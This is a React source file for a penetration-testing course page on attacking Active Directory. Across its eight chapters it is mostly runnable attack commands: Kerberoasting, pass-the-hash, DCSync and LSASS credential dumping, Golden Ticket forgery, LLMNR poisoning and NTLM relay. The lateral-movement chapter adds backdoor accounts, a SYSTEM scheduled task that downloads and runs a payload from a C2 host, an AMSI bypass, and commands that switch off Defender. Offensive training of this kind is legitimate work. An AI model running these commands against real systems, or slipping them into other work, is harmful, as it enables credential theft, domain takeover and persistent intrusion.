'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#ff4136'

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#9a8a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem', fontFamily: 'sans-serif' }}>{children}</p>
)

const H = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 700, color: accent, marginTop: '2rem', marginBottom: '0.5rem', letterSpacing: '0.08em' }}>{children}</h3>
)

const Note = ({ label, children }: { label?: string; children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,65,54,0.05)', border: '1px solid rgba(255,65,54,0.25)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '6px' }}>{label || 'NOTE'}</div>
    <p style={{ color: '#9a8a8a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
  </div>
)

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#7a5a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080202', border: '1px solid #2e0000', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#ff6b6b', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #2e0000' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#cc2200', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #1a0000', background: i % 2 === 0 ? 'transparent' : 'rgba(255,65,54,0.02)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#9a8a8a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'ad-ch1',
    title: 'Active Directory Architecture',
    difficulty: 'BEGINNER',
    readTime: '15 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>Active Directory (AD) is Microsoft's directory service — the backbone of nearly every enterprise Windows environment. It authenticates users, manages machines, enforces Group Policy, and controls resource access. For a penetration tester, understanding AD is the single highest-leverage skill in enterprise engagements.</P>

        <H>Core Components</H>
        <Table headers={['COMPONENT', 'FUNCTION', 'ATTACK RELEVANCE']} rows={[
          ['Domain Controller (DC)', 'Authenticates users, stores the AD database (NTDS.dit)', 'Primary target — compromise DC = own the domain'],
          ['NTDS.dit', 'The AD database — contains all user password hashes', 'Dump with DCSync or physical access for all domain hashes'],
          ['LDAP', 'Protocol for querying AD objects (users, groups, computers)', 'Enumerate users, groups, GPOs, SPN accounts'],
          ['Kerberos', 'Authentication protocol using tickets instead of passwords', 'Kerberoasting, Pass-the-Ticket, Golden/Silver Tickets'],
          ['NTLM', 'Older challenge-response auth protocol — still widely used', 'Pass-the-Hash, NTLM relay, Responder captures'],
          ['Group Policy (GPO)', 'Centrally push configurations to domain machines', 'Writable GPOs allow pushing malicious configs domain-wide'],
          ['Service Principal Names', 'Identifiers for Kerberos-enabled services', 'Kerberoasting — request TGS ticket for any SPN user'],
          ['Domain Trust', 'Relationship allowing cross-domain auth', 'Trust abuse for cross-domain privilege escalation'],
        ]} />

        <H>Basic Manual Enumeration (No Tools)</H>
        <Pre label="// BUILT-IN WINDOWS COMMANDS — NO TOOLS NEEDED">{`# Get domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# List all domain users
net user /domain

# List all domain groups
net group /domain

# List Domain Admins members
net group "Domain Admins" /domain

# Current user privileges and group membership
whoami /all

# System domain info
systeminfo | findstr /i "domain"

# DNS — find Domain Controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local`}</Pre>

        <H>PowerView Quick Enumeration</H>
        <Pre label="// POWERVIEW — LOAD AND ENUMERATE">{`# Load PowerView (from compromised host with web access):
IEX(New-Object Net.WebClient).downloadString('http://YOUR_IP/PowerView.ps1')

# Or bypass execution policy and load from disk:
powershell -ep bypass -c "Import-Module .\PowerView.ps1"

# Basic enumeration:
Get-Domain
Get-DomainUser | select samaccountname, description
Get-DomainGroup "Domain Admins" | select members
Get-DomainComputer | select name, operatingsystem
Get-DomainGPO | select displayname

# Find Kerberoastable users (have SPNs):
Get-DomainUser -SPN | select name, serviceprincipalname

# Find AS-REP Roastable users:
Get-DomainUser -PreauthNotRequired | select samaccountname`}</Pre>

        <Note label="BEGINNER NOTE">Think of Active Directory like a company's HR database + security guard combined. The Domain Controller is the head of HR — it knows every employee (user account), their access badge (password hash), and what rooms they can enter (permissions). Attacking AD means convincing HR to hand over everyone's badges.</Note>
      </div>
    ),
    takeaways: [
      'The Domain Controller stores all domain password hashes in NTDS.dit — it is the ultimate target',
      'Kerberos uses encrypted tickets for authentication — the ticket encryption is what attackers crack',
      'NTLM authentication sends the hash directly — hashes can be used without cracking (Pass-the-Hash)',
      'Built-in Windows commands (net user, whoami) reveal enormous amounts of AD info with no extra tools',
    ]
  },

  {
    id: 'ad-ch2',
    title: 'Enumeration: BloodHound & LDAP',
    difficulty: 'INTERMEDIATE',
    readTime: '20 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>BloodHound is the most powerful Active Directory enumeration tool ever created. It maps the entire domain into a graph database, visually revealing attack paths that are completely invisible in manual enumeration. A path to Domain Admin that would take days to find manually becomes obvious in seconds.</P>

        <H>BloodHound Setup</H>
        <Pre label="// BLOODHOUND — INSTALL AND START">{`# Install BloodHound and Neo4j (Kali/Debian):
sudo apt install bloodhound neo4j

# Start Neo4j database:
sudo neo4j start
# Open: http://localhost:7474
# Default creds: neo4j / neo4j — change on first login

# Start BloodHound GUI:
bloodhound
# Enter the Neo4j credentials you just set`}</Pre>

        <H>Collecting Data with SharpHound</H>
        <Pre label="// SHARPHOUND — DATA COLLECTION FROM TARGET">{`# From a compromised Windows domain-joined host:
.\SharpHound.exe -c All
# Creates: 20240101_BloodHound.zip

# Remote collection from Kali (needs valid domain creds):
pip install bloodhound
python3 bloodhound-python -u USER -p PASS -d domain.local -ns DC_IP -c All
# Creates JSON files in current directory

# Upload to BloodHound:
# Drag and drop the .zip or JSON files into BloodHound interface`}</Pre>

        <H>High-Value BloodHound Queries</H>
        <Pre label="// BLOODHOUND — MOST USEFUL QUERIES">{`# In BloodHound — go to Analysis tab:

Find all Domain Admins
  → Analysis > Find all Domain Admins

Shortest Attack Path to Domain Admin
  → Right-click your compromised user → Mark as Owned
  → Analysis > Find Shortest Paths to Domain Admins

Find all Kerberoastable Users (have SPNs)
  → Analysis > List all Kerberoastable Accounts

Find AS-REP Roastable Users
  → Analysis > Find AS-REP Roastable Users

Find computers where Domain Users can RDP
  → Analysis > Find Workstations where Domain Users can RDP

Find users with DCSync rights
  → Analysis > Find Principals with DCSync Rights`}</Pre>

        <H>Manual LDAP Enumeration</H>
        <Pre label="// LDAPSEARCH — QUERY AD DIRECTLY">{`sudo apt install ldap-utils

# Enumerate all domain users:
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
  -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# Find Kerberoastable users (have SPNs):
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
  -b "dc=domain,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Find AS-REP Roastable users (no preauth required):
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Enumerate Domain Admins group members:
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "Password" \
  -b "dc=domain,dc=local" "(&(objectClass=group)(cn=Domain Admins))" member`}</Pre>

        <Note label="PRO TIP">BloodHound's "Shortest Path to Domain Admins" query is the most used feature in real engagements. It finds attack chains like: your user has GenericWrite on a group, that group has AdminTo rights on a machine, and that machine has a session with a Domain Admin. Manually finding this chain would take hours — BloodHound finds it instantly.</Note>
      </div>
    ),
    takeaways: [
      'BloodHound maps the entire domain graph — use it before manually enumerating attack paths',
      'SharpHound collects data from inside the domain; bloodhound-python works from Kali with valid creds',
      'The "Mark as Owned" + "Shortest Path to DA" workflow is the core BloodHound attack loop',
      'LDAP queries can enumerate Kerberoastable and AS-REP Roastable users directly from Kali',
    ]
  },

  {
    id: 'ad-ch3',
    title: 'Kerberoasting & AS-REP Roasting',
    difficulty: 'INTERMEDIATE',
    readTime: '18 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>Kerberoasting and AS-REP Roasting are the two most commonly used Kerberos attacks. They both extract encrypted data that can be cracked offline — no brute-forcing the DC, no lockouts, no noise on the wire beyond a single authentication request.</P>

        <H>How Kerberos Works (Attack Perspective)</H>
        <Pre label="// KERBEROS AUTHENTICATION FLOW">{`CLIENT                 KDC (Domain Controller)              SERVICE
  |                           |                                 |
  |-- AS-REQ --------------> |   Client proves identity        |
  |   (encrypted timestamp)   |   using their NT hash           |
  |                           |                                 |
  |<- AS-REP --------------- |   KDC returns TGT               |
  |   TGT encrypted with      |   encrypted with krbtgt hash    |
  |   krbtgt hash             |                                 |
  |                           |                                 |
  |-- TGS-REQ -------------> |   Client requests service ticket|
  |   (TGT + service SPN)     |   for a specific service        |
  |                           |                                 |
  |<- TGS-REP --------------- |   TGS encrypted with            |
  |   TGS encrypted with      |   SERVICE ACCOUNT hash <------- KERBEROASTING
  |   service account hash    |                                 |
  |                           |                                 |
  |-- AP-REQ ----------------------------------------> |       |
  |   (TGS presented to service)                       |       |

ATTACK SURFACES:
  AS-REP: If user has no preauth -> KDC sends hash without verifying identity
  TGS:    Any domain user can request TGS for any SPN -> encrypted with service hash
  TGT:    If krbtgt hash known -> forge any TGT -> Golden Ticket`}</Pre>

        <H>Kerberoasting</H>
        <P>Any domain user can request a Ticket Granting Service (TGS) for any Service Principal Name. The TGS is encrypted with the service account's NTLM hash — crackable offline. Service accounts often have weak passwords and never-expiring credentials.</P>
        <Pre label="// KERBEROASTING — FULL ATTACK CHAIN">{`# Step 1: Find accounts with SPNs (Kerberoastable)
# From Kali with impacket:
python3 GetUserSPNs.py domain.local/user:Password -dc-ip DC_IP

# Step 2: Request TGS tickets and capture hashes
python3 GetUserSPNs.py domain.local/user:Password -dc-ip DC_IP -request
# Output: $krb5tgs$23$*svc_sql$DOMAIN.LOCAL$domain.local/svc_sql*$a3b...

# Step 3: Crack offline with hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r rules/best64.rule

# From Windows (no tools needed beyond Rubeus):
.\rubeus.exe kerberoast /outfile:hashes.txt

# High-value SPN targets:
# MSSQLSvc, TERMSRV, HTTP, cifs, svc_backup
# Service accounts often have weak passwords and NEVER expire`}</Pre>

        <H>AS-REP Roasting</H>
        <P>If a user has "Do not require Kerberos preauthentication" set, the KDC returns an AS-REP encrypted with the user's hash without verifying who is asking. No credentials required — just a list of usernames.</P>
        <Pre label="// AS-REP ROASTING — UNAUTHENTICATED ATTACK">{`# Step 1: Find AS-REP Roastable users
# Unauthenticated (only need usernames):
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip DC_IP

# With credentials (enumerate and attack in one step):
python3 GetNPUsers.py domain.local/user:Password -request -format hashcat -dc-ip DC_IP

# From Windows:
.\rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Step 2: Crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Hash format: $krb5asrep$23$user@domain.local:...

# Why check for this: rare but extremely high value
# No creds needed - just username spray is enough`}</Pre>

        <Note label="OPSEC NOTE">Both attacks generate only a single TGS/AS-REP request — minimal network noise. However, requesting tickets for hundreds of SPNs rapidly will trigger alerts. Request one at a time with delays in monitored environments. AS-REP Roasting is even stealthier since it can be done without any valid credentials.</Note>
      </div>
    ),
    takeaways: [
      'Kerberoasting requires only a valid domain user account — any user can request a TGS for any SPN',
      'AS-REP Roasting can be performed without any credentials — only usernames are required',
      'Both attacks produce hashes that are cracked entirely offline — no lockouts, no brute force against DC',
      'Service accounts are prime Kerberoasting targets — they often have weak, never-expiring passwords',
    ]
  },

  {
    id: 'ad-ch4',
    title: 'Pass-the-Hash & Pass-the-Ticket',
    difficulty: 'INTERMEDIATE',
    readTime: '15 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>You do not need to crack a hash to use it. NTLM authentication sends the hash directly as proof of identity. If you have the hash, you can authenticate as that user without ever knowing their password. Similarly, Kerberos tickets can be extracted from memory and used directly.</P>

        <H>Pass-the-Hash with CrackMapExec</H>
        <Pre label="// PASS-THE-HASH — LATERAL MOVEMENT AT SCALE">{`# Test hash across entire subnet (find where it works):
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH_HERE

# Execute commands via PTH:
cme smb 192.168.1.100 -u Administrator -H NTLM_HASH_HERE -x "whoami"
cme smb 192.168.1.100 -u Administrator -H NTLM_HASH_HERE -x "net user /domain"

# Dump SAM hashes from remote machine:
cme smb 192.168.1.100 -u Administrator -H NTLM_HASH_HERE --sam

# List shares:
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH_HERE --shares`}</Pre>

        <H>Impacket PTH Execution</H>
        <Pre label="// IMPACKET — GET SHELLS VIA PASS-THE-HASH">{`# PSExec via PTH (gives SYSTEM shell, leaves logs):
python3 psexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# WMIExec via PTH (stealthier — no service created):
python3 wmiexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# SMBExec (no file drop on disk):
python3 smbexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# Format: -hashes LM_HASH:NT_HASH
# If no LM hash (modern Windows): use aad3b435b51404eeaad3b435b51404ee as LM
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH admin@TARGET`}</Pre>

        <H>How to Get NTLM Hashes</H>
        <Pre label="// HASH EXTRACTION METHODS">{`# 1. Mimikatz (from compromised Windows host):
sekurlsa::logonpasswords    # dump plaintext + hashes from LSASS
lsadump::sam                # dump local SAM database

# 2. Dump SAM remotely (need admin):
python3 secretsdump.py domain/admin:pass@TARGET
python3 secretsdump.py -hashes :NTLM_HASH domain/admin@TARGET

# 3. Meterpreter hashdump:
meterpreter> hashdump
meterpreter> run post/multi/recon/local_exploit_suggester

# 4. Registry SAM backup (local admin):
reg save HKLM\SAM C:\sam.bak
reg save HKLM\SYSTEM C:\system.bak
# Transfer to Kali, then:
python3 secretsdump.py -sam sam.bak -system system.bak LOCAL`}</Pre>

        <H>Pass-the-Ticket</H>
        <Pre label="// PASS-THE-TICKET — USE KERBEROS TICKETS">{`# Export tickets with Mimikatz:
sekurlsa::tickets /export
# Creates .kirbi files

# Import and use a ticket:
kerberos::ptt ticket.kirbi

# Rubeus — list active tickets:
.\rubeus.exe triage

# Rubeus — dump tickets:
.\rubeus.exe dump /luid:0x3e4 /service:krbtgt

# Rubeus — inject ticket:
.\rubeus.exe ptt /ticket:BASE64_TICKET_HERE

# Linux — use Kerberos ticket with impacket:
export KRB5CCNAME=/path/to/ticket.ccache
python3 psexec.py -k -no-pass domain/admin@server.domain.local`}</Pre>
      </div>
    ),
    takeaways: [
      'NTLM hashes can authenticate directly — cracking is optional, not required for lateral movement',
      'CrackMapExec is the fastest way to test a hash across an entire subnet simultaneously',
      'WMIExec is stealthier than PSExec — it does not create a service entry or drop files',
      'Kerberos tickets can be extracted from memory and injected into other sessions (Pass-the-Ticket)',
    ]
  },

  {
    id: 'ad-ch5',
    title: 'DCSync & Credential Dumping',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>DCSync abuses Active Directory's replication protocol. Domain Controllers replicate the NTDS.dit database between each other. Any account with DS-Replication rights can trigger this replication and request password hashes for any domain user — including the krbtgt account.</P>

        <H>DCSync Attack</H>
        <Pre label="// DCSYNC — DUMP ALL DOMAIN HASHES">{`# Requirements: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
# Default holders: Domain Admins, Enterprise Admins, DCs

# Mimikatz DCSync (from a domain-joined Windows host):
lsadump::dcsync /user:krbtgt                  # dump krbtgt hash
lsadump::dcsync /user:Administrator           # dump admin hash
lsadump::dcsync /domain:domain.local /all     # dump ALL hashes

# Impacket secretsdump (from Kali — no Mimikatz needed):
python3 secretsdump.py domain.local/admin:Password@DC_IP
python3 secretsdump.py -hashes :NTLM_HASH domain.local/admin@DC_IP

# Output format:
# [*] Dumping Domain Credentials (domain/uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# The krbtgt hash is the holy grail:
# - Create Golden Tickets for ANY user
# - Golden Tickets survive password resets until krbtgt is reset TWICE
# - Domain persistence that can last months or years`}</Pre>

        <H>LSASS Memory Dumping</H>
        <Pre label="// DUMP LSASS — LOCAL CREDENTIAL EXTRACTION">{`# Method 1: Task Manager (GUI — if admin)
# Right-click lsass.exe → Create dump file
# Produces: C:\Windows\Temp\lsass.DMP

# Method 2: comsvcs.dll (built-in, no extra tools):
# Get LSASS PID first:
Get-Process lsass | select Id
tasklist | findstr lsass

# Create dump via rundll32:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump LSASS_PID C:\lsass.dmp full

# Method 3: ProcDump (Sysinternals — signed, less flagged):
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse dump on Kali with pypykatz:
pip install pypykatz
pypykatz lsa minidump lsass.dmp

# Or transfer to Windows and parse with Mimikatz:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords`}</Pre>

        <Note label="CRITICAL">DCSync generates event ID 4662 (Directory Service Access) on the DC. LSASS dumps generate event ID 10 from Sysmon if deployed. Both are high-confidence indicators of compromise — defenders monitoring for these will know you are there within minutes. In authorized engagements, confirm scope before running these.</Note>
      </div>
    ),
    takeaways: [
      'DCSync requires DS-Replication rights — typically only Domain Admins and Enterprise Admins have these by default',
      'secretsdump.py from Kali performs DCSync remotely without needing Mimikatz on the target',
      'The krbtgt hash is the most valuable output — it enables Golden Ticket persistence',
      'LSASS dumps can be created using only built-in Windows tools (comsvcs.dll + rundll32)',
    ]
  },

  {
    id: 'ad-ch6',
    title: 'Golden & Silver Tickets',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>Once you have the krbtgt hash from DCSync, you can forge Kerberos tickets for any user in the domain with any group membership, valid for any time period. This is the pinnacle of Active Directory compromise — complete, persistent, domain-level control.</P>

        <H>Golden Ticket</H>
        <Pre label="// GOLDEN TICKET — FORGE TGT WITH KRBTGT HASH">{`# Requirements:
# - krbtgt NTLM hash (from DCSync)
# - Domain SID (from: whoami /user — remove last -RID section)
# - Domain name

# Get domain SID:
whoami /user
# Output: DOMAIN\admin S-1-5-21-3623811015-3361044348-30300820-1013
# SID without last part: S-1-5-21-3623811015-3361044348-30300820

# Mimikatz — create and inject Golden Ticket:
kerberos::golden /user:FakeAdmin /domain:domain.local \
  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# This forges a TGT for a non-existent user
# with Domain Admin group membership
# valid for 10 years by default

# Impacket — create Golden Ticket file:
python3 ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-... \
  -domain domain.local FakeAdmin

# Use the ticket:
export KRB5CCNAME=FakeAdmin.ccache
python3 psexec.py -k -no-pass domain.local/FakeAdmin@dc.domain.local

# Key property: survives password resets
# krbtgt must be reset TWICE to invalidate Golden Tickets
# This makes Golden Tickets an extremely persistent backdoor`}</Pre>

        <H>Silver Ticket</H>
        <Pre label="// SILVER TICKET — FORGE TGS FOR SPECIFIC SERVICE">{`# Silver Ticket = forge TGS using a SERVICE ACCOUNT hash
# More stealthy than Golden (never touches DC during use)
# Target services: CIFS, HOST, HTTP, LDAP, MSSQL

# Requirements: service account NTLM hash, domain SID, target SPN

# Mimikatz — Silver Ticket for CIFS (file shares):
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /target:fileserver.domain.local \
  /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Access file shares as Administrator:
dir \\fileserver\c$

# Silver Ticket for SQL Server:
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /target:sqlserver.domain.local \
  /service:MSSQLSvc /rc4:SERVICE_ACCOUNT_HASH /ptt

# Why Silver is stealthier:
# - Never communicates with DC (no AS-REQ/TGS-REQ)
# - Only the target service validates the ticket
# - Much harder to detect without endpoint logging`}</Pre>

        <Note label="NOTE">The difference: Golden Ticket = forge a TGT using krbtgt hash (affects whole domain). Silver Ticket = forge a TGS using a service account hash (affects only that service). Golden Tickets are more powerful. Silver Tickets are more stealthy.</Note>
      </div>
    ),
    takeaways: [
      'Golden Tickets forge TGTs using the krbtgt hash — granting access to any resource in the domain',
      'Golden Tickets survive password changes until krbtgt is reset twice — persistent domain compromise',
      'Silver Tickets target a specific service and never touch the DC — significantly stealthier',
      'Both ticket types can be used from Linux with impacket by setting the KRB5CCNAME environment variable',
    ]
  },

  {
    id: 'ad-ch7',
    title: 'LLMNR Poisoning & SMB Relay',
    difficulty: 'INTERMEDIATE',
    readTime: '15 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>When Windows cannot resolve a hostname via DNS, it falls back to LLMNR and NBT-NS — broadcast protocols that ask the entire local network "who has this hostname?" Any machine on the network can respond. Responder does exactly that, poisoning these requests to capture NTLM authentication attempts.</P>

        <H>Responder — LLMNR/NBT-NS Poisoning</H>
        <Pre label="// RESPONDER — CAPTURE NTLM HASHES">{`# Start Responder in capture mode:
sudo python3 Responder.py -I eth0 -rdwv

# Flags:
# -r  Answers for MSSQL/WinRM (Windows Remote Management)
# -d  DHCP poisoning (rare, dangerous on prod networks)
# -w  WPAD rogue proxy (captures proxy auth credentials)
# -v  Verbose output

# Captured hashes saved automatically to:
ls /usr/share/responder/logs/
# Files: SMB-NTLMv2-SSP-192.168.1.50.txt, etc.

# Crack NTLMv2 hashes (mode 5600):
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# Analysis/passive mode (no poisoning — just watch):
sudo python3 Responder.py -I eth0 -A`}</Pre>

        <H>SMB Relay Attack</H>
        <P>Instead of capturing and cracking NTLM hashes, relay them in real-time to another host. If the relayed credential has local admin rights on the target, you get full access — no cracking required.</P>
        <Pre label="// NTLM RELAY — STEP BY STEP">{`# Step 1: Find hosts with SMB signing disabled (relay targets):
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Step 2: Disable SMB + HTTP in Responder (we relay, not capture):
# Edit /usr/share/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# Step 3: Start ntlmrelayx pointing at targets:
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support

# Step 4: Start Responder to capture and forward:
sudo python3 Responder.py -I eth0 -rdwv

# When any machine on the network attempts to authenticate,
# ntlmrelayx relays that credential to the relay targets.
# If successful with local admin rights -> auto-dumps SAM hashes.

# Get interactive shell on successful relay:
python3 ntlmrelayx.py -tf relay_targets.txt -smb2support -i

# Relay to LDAP for adding DCSync rights to a user:
python3 ntlmrelayx.py -t ldap://DC_IP --delegate-access`}</Pre>

        <Note label="OPSEC NOTE">Responder is extremely noisy on the network — every LLMNR/NBT-NS broadcast is answered with your IP. Network analysts and IDS will see this immediately. In authorized engagements, use -A (analysis mode) first to understand how noisy the environment is, then switch to active mode if stealth is not required.</Note>
      </div>
    ),
    takeaways: [
      'LLMNR/NBT-NS poisoning works because Windows broadcasts name resolution requests on the local network',
      'SMB signing disabled = SMB relay possible. CrackMapExec --gen-relay-list finds all vulnerable targets',
      'NTLM relay does not require cracking — it reuses the credential in real-time against another target',
      'Responder is loud — every broadcast gets answered. Use analysis mode (-A) first to assess risk',
    ]
  },

  {
    id: 'ad-ch8',
    title: 'Lateral Movement & Persistence',
    difficulty: 'ADVANCED',
    readTime: '18 min',
    labLink: '/modules/active-directory/lab',
    content: (
      <div>
        <P>Owning a single host is the start, not the finish. Lateral movement is the art of expanding access across the network using credentials and trust relationships gained from the initial foothold. Persistence ensures you maintain access even after reboots, password changes, and incident response.</P>

        <H>Impacket Suite for Lateral Movement</H>
        <Pre label="// IMPACKET — REMOTE EXECUTION METHODS">{`# PSExec — creates a service (admin required, noisy, leaves logs):
python3 psexec.py domain.local/admin:Password@TARGET
python3 psexec.py -hashes :NTLM_HASH domain.local/admin@TARGET

# WMIExec — uses WMI (no service, stealthier):
python3 wmiexec.py domain.local/admin:Password@TARGET
python3 wmiexec.py -hashes :NTLM_HASH domain.local/admin@TARGET "whoami"

# SMBExec — SMB pipe execution (no file written to disk):
python3 smbexec.py domain.local/admin:Password@TARGET

# ATExec — Windows Task Scheduler:
python3 atexec.py domain.local/admin:Password@TARGET "whoami"

# SecretsDump — dump credentials remotely (requires admin):
python3 secretsdump.py domain.local/admin:Password@TARGET

# Stealth ranking (most stealthy first):
# ATExec > WMIExec > SMBExec > PSExec`}</Pre>

        <H>Persistence Techniques</H>
        <Pre label="// PERSISTENCE — SURVIVE REBOOTS AND IR">{`# Add local backdoor admin (on compromised host):
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Add domain user and elevate (requires Domain Admin):
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain

# Scheduled task (runs as SYSTEM on logon):
schtasks /create /tn "WindowsUpdate" \
  /tr "powershell -WindowStyle Hidden -ep bypass -c 'IEX(New-Object Net.WebClient).downloadString(\"http://C2_IP/payload.ps1\")'" \
  /sc onlogon /ru SYSTEM

# Registry run key (runs on user logon):
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsUpdate" /t REG_SZ /d "C:\backdoor.exe"

# DCSync rights backdoor (high-value, stealthy persistence):
# Grant replication rights to a regular user
# They can now DCSync without being in Domain Admins
Add-ObjectAcl -TargetDistinguishedName "DC=domain,DC=local" \
  -PrincipalIdentity backdoor -Rights DCSync`}</Pre>

        <H>Defence Evasion</H>
        <Pre label="// EVADING COMMON WINDOWS DEFENCES">{`# AMSI bypass (disables PowerShell script scanning):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution policy bypass:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX(...)"

# Disable Defender real-time protection (requires admin):
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\Public\"

# LOLBins — use signed binaries for execution:
certutil -decode encoded.b64 payload.exe
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""payload.exe"" :close")
regsvr32 /u /s /i:http://C2_IP/payload.sct scrobj.dll`}</Pre>

        <Note label="CRITICAL">Adding accounts to Domain Admins is the loudest possible persistence method — it generates event ID 4728 and will alert any SOC that has basic monitoring. DCSync-rights backdoor is far stealthier: a regular-looking user account that can silently replicate the entire domain database. Defenders rarely audit replication ACLs.</Note>
      </div>
    ),
    takeaways: [
      'WMIExec and SMBExec are stealthier than PSExec — they do not create a service entry on the target',
      'DCSync rights granted to a regular account is the stealthiest persistence technique — rarely detected',
      'Scheduled tasks running as SYSTEM persist across password changes and many incident response actions',
      'AMSI bypass is essential before running offensive PowerShell — it disables script content inspection',
    ]
  },
]

export default function ActiveDirectoryModule() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a4a4a' }}>
        <Link href="/" style={{ color: '#5a4a4a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/active-directory" style={{ color: '#5a4a4a', textDecoration: 'none' }}>ACTIVE DIRECTORY ATTACKS</Link>
        <span>›</span>
        <span style={{ color: accent }}>CONCEPT</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a4a4a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MOD-05 · ADVANCED MODULE</div>
